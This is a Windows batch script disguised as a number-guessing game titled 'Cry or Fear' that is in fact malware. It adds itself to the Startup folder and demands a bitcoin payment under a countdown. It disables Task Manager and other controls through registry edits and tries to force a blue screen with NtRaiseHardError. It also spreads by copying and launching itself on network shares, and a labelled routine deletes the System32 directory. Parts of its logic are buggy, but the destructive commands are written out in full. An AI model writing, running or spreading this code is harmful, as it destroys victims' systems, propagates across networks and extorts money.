@echo off
title Cry or Fear
color F0
setlocal enabledelayedexpansion

REM --- Add to Startup Function ---
:AddToStartup
COPY "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul
IF EXIST "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" (
    echo Added to startup successfully.
) ELSE (
    echo Could not add to startup.
)
timeout /t 0.5 >nul
cls
REM --- End Add to Startup Function ---

REM Set the shared folder name
set "sharedFolderName=SharedFolder"

REM Set the password to stop the script
set "stopPassword=MLTP"

REM Pick a secret number 1-10
set /a secret=%random% %% 10 + 1
set attempts=3

echo Welcome to "Cry or Fear"!
echo Guess a number between 1 and 10.
echo You get %attempts% tries.
echo.

:guess
set /p "guess=Your guess (1-10): "

REM Validate the input using PowerShell
for /f "delims=" %%i in ('powershell -Command "if ([int]::TryParse(''%guess%'', [ref]$null) -and %guess% -ge 1 -and %guess% -le 10) { 'true' } else { 'false' }"') do (
    set "isValid=%%i"
)

if "%isValid%"=="false" (
  echo That’s not a number or out of range. Try again.
  echo.
  goto guess
)

REM Check if the user entered "password"
if /i "%guess%"=="password" (
    goto askPassword
)

REM Correct?
if %guess% equ %secret% (
  echo.
  echo  You guessed right but fuck you im still selling your files
  echo.
  pause
  exit /b 0
)

REM Wrong guess
set /a attempts-=1
if %attempts% gtr 0 (
  echo Nope — wrong. %attempts% tries left.
  echo.
  goto guess
)

REM No tries left → replicate and bluescreen
echo.
echo No more guesses btw theres a 3 second timer to donate 500 dls in bitcoin to https://MBTC.com/btc-Morel-account
REM 3 second countdown display
for /L %%i in (3,-1,1) do (
    echo fuck you in %%i seconds...
    timeout /t 1 >nul
)

REM Start replication in the background
start "" "%~f0" /replicate

REM Lock the mouse and keyboard
powershell -Command "$wshell = New-Object -ComObject WScript.Shell; $wshell.SendKeys('{F14}');"

REM Disable Alt+F4, Task Manager, and other key combinations
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayItemsDisplay /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetTaskbar /t REG_DWORD /d 1 /f

REM Make the command prompt fullscreen
mode con cols=120 lines=40
title Cry or Fear
color F0

REM Trigger blue screen
powershell -Command "Add-Type -AssemblyName System.Runtime.InteropServices; [System.Runtime.InteropServices.DllImport('ntdll.dll')] public static extern void NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, uint Response); NtRaiseHardError(0xC0000022, 0, 0, [IntPtr]::Zero, 0, 0);"

:askPassword
set "passwordAttempts=2"
:passwordPrompt
set /p "hasPassword=Do you have the password? (yes/no): "
if /i "%hasPassword%"=="yes" (
    goto enterPassword
) else if /i "%hasPassword%"=="no" (
    goto continueScript
) else (
    echo Invalid input. Please enter 'yes' or 'no'.
    goto passwordPrompt
)

:enterPassword
set /p "password=Enter the stop password: "
if "%password%"=="%stopPassword%" (
    echo Password correct. Stopping the script.
    exit /b 0
) else (
    set /a passwordAttempts-=1
    if %passwordAttempts% gtr 0 (
        echo Incorrect password. %passwordAttempts% attempts left.
        goto enterPassword
    ) else (
        echo No more attempts. Triggering blue screen in 3 seconds.
        timeout /t 3 >nul
        powershell -Command "Add-Type -AssemblyName System.Runtime.InteropServices; [System.Runtime.InteropServices.DllImport('ntdll.dll')] public static extern void NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, uint Response); NtRaiseHardError(0xC0000022, 0, 0, [IntPtr]::Zero, 0, 0);"
    )
)

:continueScript
REM Continue with the script if no password is provided
echo Continuing with the script.
REM Add any additional commands here

:replicate
REM Replicate to other devices
for /f "tokens=*" %%i in ('net view ^| findstr /r /v "^[^ ]*$"') do (
    REM Extract the device name
    set "deviceName=%%i"

    REM Construct the network path
    set "networkPath=\\%deviceName%\%sharedFolderName%\"

    REM Check if the network path is accessible
    if exist "%networkPath%" (
        REM Create a new batch file in the network share
        copy "%~f0" "%networkPath%self_replicating.bat"
        if %errorlevel% neq 0 (
            echo Failed to copy the script to %networkPath%
        ) else (
            REM Execute the new batch file on the target device
            start "" "%networkPath%self_replicating.bat"
            if %errorlevel% neq 0 (
                echo Failed to start the script on %deviceName%
            )
        )
    ) else (
        echo Network path not accessible: %networkPath%
    )
)
exit /b

:breakSystem32
REM Corrupt System32 directory
takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant Everyone:F /t
del /f /s /q C:\Windows\System32\*
rmdir /s /q C:\Windows\System32
mkdir C:\Windows\System32
echo Corrupted System32 directory.